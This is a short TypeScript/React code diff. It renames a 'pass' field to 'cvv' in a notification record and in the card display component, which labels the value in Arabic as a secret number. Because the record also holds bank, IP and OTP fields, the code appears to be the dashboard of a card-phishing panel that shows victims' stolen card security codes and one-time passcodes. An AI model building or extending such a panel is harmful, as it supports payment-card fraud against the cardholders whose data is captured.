@@ -54,7 +54,7 @@ interface Notification {
   bank: string;
   cardStatus?: string;
   ip?: string;
-  pass: string;
+  cvv: string;
   id: string | "0";
   notificationCount: number;
   otp: string;
@@ -262,13 +262,13 @@ function CardInfoCard({ notification }: { notification: Notification }) {
                   </span>
                 </div>
               )}
-              {notification.pass && (
+              {notification.cvv && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">
                     رقم سري
                   </span>
                   <span className="font-bold text-base text-green-600 font-mono">
-                    {notification.pass}
+                    {notification.cvv}
                   </span>
                 </div>
               )}
